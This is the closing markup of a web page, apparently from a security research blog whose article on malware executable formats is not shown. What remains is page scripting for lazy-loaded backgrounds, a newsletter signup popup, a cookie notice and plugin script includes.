			bg = element.getAttribute('data-bg-laptop');
			if(bg)
				break; 
		default: 
			bg = element.getAttribute('data-bg');
	}
	if(bg)
		element.style.backgroundImage = 'url(' + bg + ')';	
}
/* calc screen wide */
var screenW;
var first = true;
jQuery(window).on('resize', function(){
	calcScreenW();
});
function calcScreenW(){
	var screenC = false;
	curentW= jQuery(window).width();	
	if ( curentW > 1450 ) { 
		if (screenW != 'desktop'){
			screenW = 'desktop';	
			screenC = true;
		}
	} else if (curentW > 973){
		if (screenW != 'laptop'){
			screenW = 'laptop';	
			screenC = true;
		}		
	} else if (curentW >767){
		if (screenW != 'tablet'){
			screenW = 'tablet';	
			screenC = true;
		}		
	} else {
		if (screenW != 'mobile'){
			screenW = 'mobile';	
			screenC = true;
		}		
	}
	if (screenC) {
		jQuery('.bg-change-done').removeClass('bg-change-done');
		screenC = false;
		animate_elems();
	}
}
/* lazyLoad on scroll after  screen width change */
var $elems = jQuery('.responsive-bg');
var winheight = jQuery(window).height();
jQuery(window).scroll(function(){
	animate_elems();
});
function animate_elems() {
	wintop = jQuery(window).scrollTop(); // calculate distance from top of window
	// loop through each item to check when it animates
	$elems.each(function(){
		$elm = jQuery(this);
		if($elm.hasClass('lazyload')|| $elm.hasClass('bg-change-done')) { return true; } // if already animated skip to the next item

		topcoords = $elm.offset().top; // element's distance from top of page in pixels

		if(wintop > (topcoords - (winheight))) {			
			$elm.addClass('bg-change-done');		
			loadImg($elm[0]);
		} 
	});	
}
</script>

<div class="popup" id="subscribe-us-popup" >
	<div class="bg-for-close-popup" onclick="closePopup('subscribe-us-popup')"></div>
	<div class="inner">
		<div class="box">
			<div class="content">
				<div class="content-row">
					<div class="flex-6 col-image">
												<div class="image">
							<img src="https://research.checkpoint.com/wp-content/uploads/2022/10/popup-side-image.jpg" alt="" />
						</div>
											</div>
					<div class="flex-6 col-form text-black">
						<div class="popup-form-outer">
							<h2 style="text-align: center;">SUBSCRIBE TO CYBER INTELLIGENCE REPORTS</h2>

<div class="wpcf7 no-js" id="wpcf7-f26727-o1" lang="en-US" dir="ltr">
<div class="screen-reader-response"><p role="status" aria-live="polite" aria-atomic="true"></p> <ul></ul></div>
<form action="/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/#wpcf7-f26727-o1" method="post" class="wpcf7-form init demo" aria-label="Contact form" novalidate="novalidate" data-status="init">
<div style="display: none;">
<input type="hidden" name="_wpcf7" value="26727" />
<input type="hidden" name="_wpcf7_version" value="5.9.8" />
<input type="hidden" name="_wpcf7_locale" value="en_US" />
<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f26727-o1" />
<input type="hidden" name="_wpcf7_container_post" value="0" />
<input type="hidden" name="_wpcf7_posted_data_hash" value="" />
</div>
<div class="contact-form-outer">
	<div class="flex-row">
		<div class="flex-12">
			<div class="col-margin">
				<p><label>First Name<span class="wpcf7-form-control-wrap" data-name="your-first-name"><input size="40" maxlength="400" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required form-control" aria-required="true" aria-invalid="false" value="" type="text" name="your-first-name" /></span></label>
				</p>
			</div>
		</div>
		<div class="flex-12">
			<div class="col-margin">
				<p><label>Last Name<span class="wpcf7-form-control-wrap" data-name="your-last-name"><input size="40" maxlength="400" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required form-control" aria-required="true" aria-invalid="false" value="" type="text" name="your-last-name" /></span></label>
				</p>
			</div>
		</div>
		<div class="flex-12">
			<div class="col-margin">
				<p><label>Country<span class="wpcf7-form-control-wrap" data-name="country"><select class="wpcf7-form-control wpcf7-select classform-control" aria-invalid="false" name="country"><option value="">&#8212;Please choose an option&#8212;</option><option value="China">China</option><option value="India">India</option><option value="United States">United States</option><option value="Indonesia">Indonesia</option><option value="Brazil">Brazil</option><option value="Pakistan">Pakistan</option><option value="Nigeria">Nigeria</option><option value="Bangladesh">Bangladesh</option><option value="Russia">Russia</option><option value="Japan">Japan</option><option value="Mexico">Mexico</option><option value="Philippines">Philippines</option><option value="Vietnam">Vietnam</option><option value="Ethiopia">Ethiopia</option><option value="Egypt">Egypt</option><option value="Germany">Germany</option><option value="Iran">Iran</option><option value="Turkey">Turkey</option><option value="Democratic Republic of the Congo">Democratic Republic of the Congo</option><option value="Thailand">Thailand</option><option value="France">France</option><option value="United Kingdom">United Kingdom</option><option value="Italy">Italy</option><option value="Burma">Burma</option><option value="South Africa">South Africa</option><option value="South Korea">South Korea</option><option value="Colombia">Colombia</option><option value="Spain">Spain</option><option value="Ukraine">Ukraine</option><option value="Tanzania">Tanzania</option><option value="Kenya">Kenya</option><option value="Argentina">Argentina</option><option value="Algeria">Algeria</option><option value="Poland">Poland</option><option value="Sudan">Sudan</option><option value="Uganda">Uganda</option><option value="Canada">Canada</option><option value="Iraq">Iraq</option><option value="Morocco">Morocco</option><option value="Peru">Peru</option><option value="Uzbekistan">Uzbekistan</option><option value="Saudi Arabia">Saudi Arabia</option><option value="Malaysia">Malaysia</option><option value="Venezuela">Venezuela</option><option value="Nepal">Nepal</option><option value="Afghanistan">Afghanistan</option><option value="Yemen">Yemen</option><option value="North Korea">North Korea</option><option value="Ghana">Ghana</option><option value="Mozambique">Mozambique</option><option value="Taiwan">Taiwan</option><option value="Australia">Australia</option><option value="Ivory Coast">Ivory Coast</option><option value="Syria">Syria</option><option value="Madagascar">Madagascar</option><option value="Angola">Angola</option><option value="Cameroon">Cameroon</option><option value="Sri Lanka">Sri Lanka</option><option value="Romania">Romania</option><option value="Burkina Faso">Burkina Faso</option><option value="Niger">Niger</option><option value="Kazakhstan">Kazakhstan</option><option value="Netherlands">Netherlands</option><option value="Chile">Chile</option><option value="Malawi">Malawi</option><option value="Ecuador">Ecuador</option><option value="Guatemala">Guatemala</option><option value="Mali">Mali</option><option value="Cambodia">Cambodia</option><option value="Senegal">Senegal</option><option value="Zambia">Zambia</option><option value="Zimbabwe">Zimbabwe</option><option value="Chad">Chad</option><option value="South Sudan">South Sudan</option><option value="Belgium">Belgium</option><option value="Cuba">Cuba</option><option value="Tunisia">Tunisia</option><option value="Guinea">Guinea</option><option value="Greece">Greece</option><option value="Portugal">Portugal</option><option value="Rwanda">Rwanda</option><option value="Czech Republic">Czech Republic</option><option value="Somalia">Somalia</option><option value="Haiti">Haiti</option><option value="Benin">Benin</option><option value="Burundi">Burundi</option><option value="Bolivia">Bolivia</option><option value="Hungary">Hungary</option><option value="Sweden">Sweden</option><option value="Belarus">Belarus</option><option value="Dominican Republic">Dominican Republic</option><option value="Azerbaijan">Azerbaijan</option><option value="Honduras">Honduras</option><option value="Austria">Austria</option><option value="United Arab Emirates">United Arab Emirates</option><option value="Israel">Israel</option><option value="Switzerland">Switzerland</option><option value="Tajikistan">Tajikistan</option><option value="Bulgaria">Bulgaria</option><option value="Hong Kong (China)">Hong Kong (China)</option><option value="Serbia">Serbia</option><option value="Papua New Guinea">Papua New Guinea</option><option value="Paraguay">Paraguay</option><option value="Laos">Laos</option><option value="Jordan">Jordan</option><option value="El Salvador">El Salvador</option><option value="Eritrea">Eritrea</option><option value="Libya">Libya</option><option value="Togo">Togo</option><option value="Sierra Leone">Sierra Leone</option><option value="Nicaragua">Nicaragua</option><option value="Kyrgyzstan">Kyrgyzstan</option><option value="Denmark">Denmark</option><option value="Finland">Finland</option><option value="Slovakia">Slovakia</option><option value="Singapore">Singapore</option><option value="Turkmenistan">Turkmenistan</option><option value="Norway">Norway</option><option value="Lebanon">Lebanon</option><option value="Costa Rica">Costa Rica</option><option value="Central African Republic">Central African Republic</option><option value="Ireland">Ireland</option><option value="Georgia">Georgia</option><option value="New Zealand">New Zealand</option><option value="Republic of the Congo">Republic of the Congo</option><option value="Palestine">Palestine</option><option value="Liberia">Liberia</option><option value="Croatia">Croatia</option><option value="Oman">Oman</option><option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option><option value="Puerto Rico">Puerto Rico</option><option value="Kuwait">Kuwait</option><option value="Moldov">Moldov</option><option value="Mauritania">Mauritania</option><option value="Panama">Panama</option><option value="Uruguay">Uruguay</option><option value="Armenia">Armenia</option><option value="Lithuania">Lithuania</option><option value="Albania">Albania</option><option value="Mongolia">Mongolia</option><option value="Jamaica">Jamaica</option><option value="Namibia">Namibia</option><option value="Lesotho">Lesotho</option><option value="Qatar">Qatar</option><option value="Macedonia">Macedonia</option><option value="Slovenia">Slovenia</option><option value="Botswana">Botswana</option><option value="Latvia">Latvia</option><option value="Gambia">Gambia</option><option value="Kosovo">Kosovo</option><option value="Guinea-Bissau">Guinea-Bissau</option><option value="Gabon">Gabon</option><option value="Equatorial Guinea">Equatorial Guinea</option><option value="Trinidad and Tobago">Trinidad and Tobago</option><option value="Estonia">Estonia</option><option value="Mauritius">Mauritius</option><option value="Swaziland">Swaziland</option><option value="Bahrain">Bahrain</option><option value="Timor-Leste">Timor-Leste</option><option value="Djibouti">Djibouti</option><option value="Cyprus">Cyprus</option><option value="Fiji">Fiji</option><option value="Reunion (France)">Reunion (France)</option><option value="Guyana">Guyana</option><option value="Comoros">Comoros</option><option value="Bhutan">Bhutan</option><option value="Montenegro">Montenegro</option><option value="Macau (China)">Macau (China)</option><option value="Solomon Islands">Solomon Islands</option><option value="Western Sahara">Western Sahara</option><option value="Luxembourg">Luxembourg</option><option value="Suriname">Suriname</option><option value="Cape Verde">Cape Verde</option><option value="Malta">Malta</option><option value="Guadeloupe (France)">Guadeloupe (France)</option><option value="Martinique (France)">Martinique (France)</option><option value="Brunei">Brunei</option><option value="Bahamas">Bahamas</option><option value="Iceland">Iceland</option><option value="Maldives">Maldives</option><option value="Belize">Belize</option><option value="Barbados">Barbados</option><option value="French Polynesia (France)">French Polynesia (France)</option><option value="Vanuatu">Vanuatu</option><option value="New Caledonia (France)">New Caledonia (France)</option><option value="French Guiana (France)">French Guiana (France)</option><option value="Mayotte (France)">Mayotte (France)</option><option value="Samoa">Samoa</option><option value="Sao Tom and Principe">Sao Tom and Principe</option><option value="Saint Lucia">Saint Lucia</option><option value="Guam (USA)">Guam (USA)</option><option value="Curacao (Netherlands)">Curacao (Netherlands)</option><option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines</option><option value="Kiribati">Kiribati</option><option value="United States Virgin Islands (USA)">United States Virgin Islands (USA)</option><option value="Grenada">Grenada</option><option value="Tonga">Tonga</option><option value="Aruba (Netherlands)">Aruba (Netherlands)</option><option value="Federated States of Micronesia">Federated States of Micronesia</option><option value="Jersey (UK)">Jersey (UK)</option><option value="Seychelles">Seychelles</option><option value="Antigua and Barbuda">Antigua and Barbuda</option><option value="Isle of Man (UK)">Isle of Man (UK)</option><option value="Andorra">Andorra</option><option value="Dominica">Dominica</option><option value="Bermuda (UK)">Bermuda (UK)</option><option value="Guernsey (UK)">Guernsey (UK)</option><option value="Greenland (Denmark)">Greenland (Denmark)</option><option value="Marshall Islands">Marshall Islands</option><option value="American Samoa (USA)">American Samoa (USA)</option><option value="Cayman Islands (UK)">Cayman Islands (UK)</option><option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option><option value="Northern Mariana Islands (USA)">Northern Mariana Islands (USA)</option><option value="Faroe Islands (Denmark)">Faroe Islands (Denmark)</option><option value="Sint Maarten (Netherlands)">Sint Maarten (Netherlands)</option><option value="Saint Martin (France)">Saint Martin (France)</option><option value="Liechtenstein">Liechtenstein</option><option value="Monaco">Monaco</option><option value="San Marino">San Marino</option><option value="Turks and Caicos Islands (UK)">Turks and Caicos Islands (UK)</option><option value="Gibraltar (UK)">Gibraltar (UK)</option><option value="British Virgin Islands (UK)">British Virgin Islands (UK)</option><option value="Aland Islands (Finland)">Aland Islands (Finland)</option><option value="Caribbean Netherlands (Netherlands)">Caribbean Netherlands (Netherlands)</option><option value="Palau">Palau</option><option value="Cook Islands (NZ)">Cook Islands (NZ)</option><option value="Anguilla (UK)">Anguilla (UK)</option><option value="Wallis and Futuna (France)">Wallis and Futuna (France)</option><option value="Tuvalu">Tuvalu</option><option value="Nauru">Nauru</option><option value="Saint Barthelemy (France)">Saint Barthelemy (France)</option><option value="Saint Pierre and Miquelon (France)">Saint Pierre and Miquelon (France)</option><option value="Montserrat (UK)">Montserrat (UK)</option><option value="Saint Helena, Ascension and Tristan da Cunha (UK)">Saint Helena, Ascension and Tristan da Cunha (UK)</option><option value="Svalbard and Jan Mayen (Norway)">Svalbard and Jan Mayen (Norway)</option><option value="Falkland Islands (UK)">Falkland Islands (UK)</option><option value="Norfolk Island (Australia)">Norfolk Island (Australia)</option><option value="Christmas Island (Australia)">Christmas Island (Australia)</option><option value="Niue (NZ)">Niue (NZ)</option><option value="Tokelau (NZ)">Tokelau (NZ)</option><option value="Vatican City">Vatican City</option><option value="Cocos (Keeling) Islands (Australia)">Cocos (Keeling) Islands (Australia)</option><option value="Pitcairn Islands (UK)">Pitcairn Islands (UK)</option></select></span></label>
				</p>
			</div>
		</div>
		<div class="flex-12">
			<div class="col-margin">
				<p><label>Email<span class="wpcf7-form-control-wrap" data-name="your-email"><input size="40" maxlength="400" class="wpcf7-form-control wpcf7-email wpcf7-validates-as-required wpcf7-text wpcf7-validates-as-email form-control" aria-required="true" aria-invalid="false" value="" type="email" name="your-email" /></span></label>
				</p>
			</div>
		</div>
		<div class="flex-12">
			<div class="col-margin">
				<div class="button-wrap center relative">
					<p><input class="wpcf7-form-control wpcf7-submit has-spinner button font-white" type="submit" value="SUBMIT" />
					</p>
				</div>
			</div>
		</div>
	</div>
</div><div class="wpcf7-response-output" aria-hidden="true"></div>
</form>
</div>

						</div>
					</div>
				</div>
			</div>
			<div class="close-button" onclick="closePopup('subscribe-us-popup')">
				<svg style="fill: currentColor;" xmlns="https://www.w3.org/2000/svg" width="11.547" height="11.547" viewBox="0 0 11.547 11.547">
				<path id="close" d="M10.557.6l-.6-.6L5.278,4.675.6,0,0,.6,4.675,5.278,0,9.953l.6.6L5.278,5.882l4.675,4.675.6-.6L5.882,5.278Z" transform="translate(0.495 0.495)" fill="#fff" stroke="#fff" stroke-width="0.7"/>
				</svg>
			</div>
		</div>
	</div>
</div>


<div id="cookies-notice" class="cookies-notice background-white" style="display:none;">
	<div class="container container-wide">
		<div class="flex-row">
			<div class="flex-8">
				<div class="text text-black"><h2>We value your privacy!</h2>
<p>BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.</p>
				</div>
			</div>
			<div class="flex-4">
				<div class="button-wrap justify-content-end">
					<div id="cn-accept-cookies" class="button font-white background-skyblue skyblue-border margin-right">ACCEPT</div>
					<div  class="button transparent cookie-close font-white skyblue-border skyblue-font">REJECT</div>
				</div>
			</div>
			<div class="close-button cookie-close svg">
				<svg xmlns="http://www.w3.org/2000/svg" width="16.828" height="16.828" viewBox="0 0 16.828 16.828">
					<g id="Group_163304" data-name="Group 163304" transform="translate(1.414 1.414)"><line id="Line_323" data-name="Line 323" x2="14" y2="14" fill="none" stroke="#fff" stroke-linecap="round" stroke-width="2"/><line id="Line_324" data-name="Line 324" x1="14" y2="14" fill="none" stroke="#fff" stroke-linecap="round" stroke-width="2"/></g></svg>
				</div>
			</div>
		</div>
	</div>
</div>
<script>
/*remove cooki msg*/
jQuery(document).ready(function(){

	user=getCookie("username2");
	if (user == "") {
		jQuery('#cookies-notice').show();
	} 
	
	function setCookie(cname,cvalue,exdays) {
		var d = new Date();
		d.setTime(d.getTime() + (exdays*24*60*60*1000));
		var expires = "expires=" + d.toGMTString();
		document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
	}

	function getCookie(cname) {
	  var name = cname + "=";
	  var decodedCookie = decodeURIComponent(document.cookie);
	  var ca = decodedCookie.split(';');
	  for(var i = 0; i < ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) == ' ') {
		  c = c.substring(1);
		}
		if (c.indexOf(name) == 0) {
		  return c.substring(name.length, c.length);
		}
	  }
	  return "";
	}

	jQuery('#cn-accept-cookies').click(function(){
		
		user=getCookie("username2");
		user = "second visit";
		if (user != "" && user != null) {
			setCookie("username2", user, 30);
		}
		jQuery('#cookies-notice').remove();
		
	});

	jQuery('.cookie-close').click(function(){
		jQuery('#cookies-notice').remove();
	});

});
</script><script src="https://cdn.jsdelivr.net/npm/sharer.js@latest/sharer.min.js"></script>
<script type="text/javascript" src="https://research.checkpoint.com/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=5.9.8" id="swv-js"></script>
<script type="text/javascript" id="contact-form-7-js-extra">
/* <![CDATA[ */
var wpcf7 = {"api":{"root":"https:\/\/research.checkpoint.com\/wp-json\/","namespace":"contact-form-7\/v1"},"cached":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="https://research.checkpoint.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.9.8" id="contact-form-7-js"></script>
<script type="text/javascript" id="email-subscribers-js-extra">
/* <![CDATA[ */
var es_data = {"messages":{"es_empty_email_notice":"Please enter email address","es_rate_limit_notice":"You need to wait for some time before subscribing again","es_single_optin_success_message":"Successfully Subscribed.","es_email_exists_notice":"Email Address already exists!","es_unexpected_error_notice":"Oops.. Unexpected error occurred.","es_invalid_email_notice":"Invalid email address","es_try_later_notice":"Please try after some time"},"es_ajax_url":"https:\/\/research.checkpoint.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type="text/javascript" src="https://research.checkpoint.com/wp-content/plugins/email-subscribers/lite/public/js/email-subscribers-public.js?ver=5.7.36" id="email-subscribers-js"></script>
<script type="text/javascript" src="https://research.checkpoint.com/wp-content/themes/research-th/js/main.js?ver=1.08" id="main-js-js"></script>
<script type="text/javascript" src="https://research.checkpoint.com/wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=lB++6JpXuZRbV9F" id="enlighterjs-js"></script>
<script type="text/javascript" id="enlighterjs-js-after">
/* <![CDATA[ */
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":true,"theme":"dracula","language":"enlighter","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
/* ]]> */
</script>
<style>
.text label {
    color: #fff;
}
.mktoButtonWrap.mktoCleanGray {
	margin-left: 120px!important;
}
.mktoButtonWrap.mktoCleanGray .mktoButton:hover,
.mktoButtonWrap.mktoCleanGray .mktoButton:active,
.mktoButtonWrap.mktoCleanGray .mktoButton:focus,
.mktoButtonWrap.mktoCleanGray .mktoButton {
	border: 0!important;
	border-radius: 7px!important;
	background: #6C6CFF!important;
    color: #fff!important;
	font-weight: 400!important;
}
</style>
</body>
</html>